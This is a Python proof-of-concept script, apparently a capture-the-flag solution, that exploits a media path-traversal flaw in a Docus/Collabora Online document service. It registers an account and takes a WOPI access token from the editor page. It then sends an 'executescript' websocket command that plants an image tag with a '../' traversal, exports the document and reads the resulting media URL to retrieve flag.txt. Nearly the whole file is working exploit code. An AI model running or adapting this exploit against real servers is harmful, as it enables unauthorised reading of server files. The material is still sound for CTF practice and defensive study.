#!/usr/bin/env python3
"""PoC: Docus Collabora media traversal (from another player, adapted timeouts)."""
import html
import re
import secrets
import sys
import time
import urllib.parse

import requests
import websocket


def fail(message):
    raise RuntimeError(message)


def response_text(response):
    return response.content.decode("utf-8", "replace")


def get_token_and_wopi(session, base, doc_id):
    r = session.get(f"{base}/edit/{doc_id}", timeout=20)
    r.raise_for_status()
    match = re.search(r'<iframe\s+src="([^"]+)"', r.text)
    if not match:
        fail("Could not find Collabora iframe in the document editor page")
    iframe = html.unescape(match.group(1))
    query = urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)
    wopi_src = query.get("WOPISrc", [None])[0]
    access_token = query.get("access_token", [None])[0]
    if not wopi_src or not access_token:
        fail("The editor iframe did not contain WOPISrc and access_token")
    return wopi_src, access_token


def receive_until(ws, prefixes, timeout, label):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            message = ws.recv()
        except websocket.WebSocketTimeoutException:
            continue
        if isinstance(message, bytes):
            continue
        if message.startswith("error:"):
            fail(f"Collabora returned {message}")
        if any(message.startswith(prefix) for prefix in prefixes):
            return message
    fail(f"Timed out waiting for {label}")


def solve(instance_url):
    parsed = urllib.parse.urlsplit(instance_url.strip().rstrip("/"))
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        fail("Enter an HTTP(S) Docus instance URL")
    base = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, "", "", ""))
    ws_scheme = "wss" if parsed.scheme == "https" else "ws"
    ws_host = parsed.netloc

    session = requests.Session()
    email = f"ctf{secrets.token_hex(6)}@corp"
    password = secrets.token_urlsafe(18)
    display_name = "Docus CTF"

    r = session.post(
        f"{base}/register",
        data={"email": email, "name": display_name, "password": password},
        allow_redirects=False, timeout=20,
    )
    if r.status_code not in (200, 201, 302, 303):
        fail(f"Registration failed ({r.status_code}): {response_text(r)[:300]}")
    r = session.post(
        f"{base}/login",
        data={"email": email, "password": password},
        allow_redirects=False, timeout=20,
    )
    if r.status_code not in (200, 302, 303):
        fail(f"Login failed ({r.status_code}): {response_text(r)[:300]}")
    print(f"[+] Registered and logged in as {email}")

    r = session.post(f"{base}/docs/create", data={"title": "poc.txt"}, allow_redirects=False, timeout=20)
    location = r.headers.get("Location", "")
    match = re.search(r"/edit/(d\d+)", location)
    if r.status_code not in (302, 303) or not match:
        fail(f"Document creation failed ({r.status_code}): {location or response_text(r)[:300]}")
    doc_id = match.group(1)
    wopi_src, access_token = get_token_and_wopi(session, base, doc_id)
    print(f"[+] Created owned document {doc_id}; WOPISrc={wopi_src}")

    # ensure blob exists before WOPI session (some instances refuse save otherwise)
    r0 = session.post(
        f"{base}/wopi/files/{doc_id}/contents",
        params={"access_token": access_token},
        data=b"initial\n",
        headers={"X-WOPI-Override": "PUT", "Content-Type": "text/plain"},
        timeout=30,
    )
    print(f"[+] Initial contents PUT -> {r0.status_code}")

    query = urllib.parse.urlencode({
        "WOPISrc": wopi_src,
        "access_token": access_token,
        "access_token_ttl": "0",
        "no_auth_header": "",
        "permission": "edit",
        "compat": "",
    })
    ws_url = f"{ws_scheme}://{ws_host}/cool/ws?{query}"
    ws = websocket.create_connection(ws_url, timeout=30, origin=base)
    try:
        ws.send(f"coolclient 0.1 {int(time.time() * 1000)} 0")
        ws.send(
            "load url=" + urllib.parse.quote(wopi_src, safe="")
            + " lang=en-US timezone=UTC clientvisiblearea=0;0;15000;15000"
        )
        receive_until(ws, ("status:", "loaded:"), 60, "document load")
        status_text = receive_until(ws, ("status:", "loaded:"), 5, "document status")
        if status_text.startswith("status:"):
            try:
                status = __import__("json").loads(status_text[len("status:"):].strip())
                if status.get("readonly"):
                    fail("The new WOPI document is read-only")
            except ValueError:
                pass

        # let the document fully initialize
        time.sleep(5)

        tag = "docus" + secrets.token_hex(5)
        javascript = (
            "(() => {"
            "  const ctx = uno.componentContext;"
            "  const sm = ctx.getServiceManager();"
            "  const sfa = sm.createInstanceWithContext('com.sun.star.ucb.SimpleFileAccess', ctx);"
            "  try { sfa.createFolder('file:///tmp/__TAG__.txt'); } catch (e) {}"
            "  const desktop = sm.createInstanceWithContext('com.sun.star.frame.Desktop', ctx);"
            "  const doc = desktop.getCurrentComponent();"
            "  const text = '<image src=\"file:///tmp/__TAG__.txt/' + '../'.repeat(10) + 'flag.txt\"/>';"
            "  doc.getText().setString(text);"
            "  return doc.getText().getString();"
            "})()"
        ).replace("__TAG__", tag).replace("\n", " ")
        ws.send("executescript 1 " + javascript)
        script_message = receive_until(ws, ("executescriptresult:",), 60, "executescript result")
        if '"error"' in script_message.lower():
            fail("The executescript request returned an error")

        export_message = None
        for attempt in range(4):
            ws.send(f"downloadas name={tag}.txt id=export{attempt} format=txt options=")
            print(f"[*] downloadas attempt {attempt} sent")
            try:
                export_message = receive_until(ws, ("downloadas:",), 120, f"downloadas attempt {attempt}")
                break
            except RuntimeError as exc:
                print(f"[*] attempt {attempt}: {exc}")
        if export_message is None:
            fail("downloadas never responded")
        match = re.search(r"\bdownloadid=([^\s]+)", export_message)
        if not match:
            fail("downloadas response did not include a download id")
        download_id = match.group(1)

        encoded_src = urllib.parse.quote(wopi_src, safe="")
        download_url = (
            f"{base}/cool/{encoded_src}/download/{download_id}"
            f"?WOPISrc={encoded_src}&compat=/ws"
        )
        r = session.get(download_url, timeout=60)
        print(f"[+] Export HTTP {r.status_code}, {len(r.content)} bytes")
        r.raise_for_status()
        exported = response_text(r)
        print("[export head]", exported[:300])
        media_match = re.search(r'src="([^"]*cool/media[^"]*)"', exported)
        if not media_match:
            fail("Export did not contain a generated /cool/media URL: " + repr(exported[:500]))
        media_url = html.unescape(media_match.group(1))
        media_url = urllib.parse.urljoin(base, media_url)
        print(f"[+] Generated media URL: {media_url}")

        r = session.get(media_url, timeout=60)
        body = r.content.decode("utf-8", "replace")
        print(f"[+] Media HTTP {r.status_code}, {len(r.content)} bytes")
        print(body, end="" if body.endswith("\n") else "\n")
        r.raise_for_status()
        flag = re.search(r"flag\{[^}\r\n]+\}", body)
        if flag:
            print(f"[+] FLAG: {flag.group(0)}")
            return flag.group(0)
        fail("Media request succeeded but the response did not contain a flag")
    finally:
        try:
            ws.close()
        except Exception:
            pass


if __name__ == "__main__":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
        url = sys.argv[1] if len(sys.argv) > 1 else input("Docus instance URL: ")
        solve(url)
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        sys.exit(1)
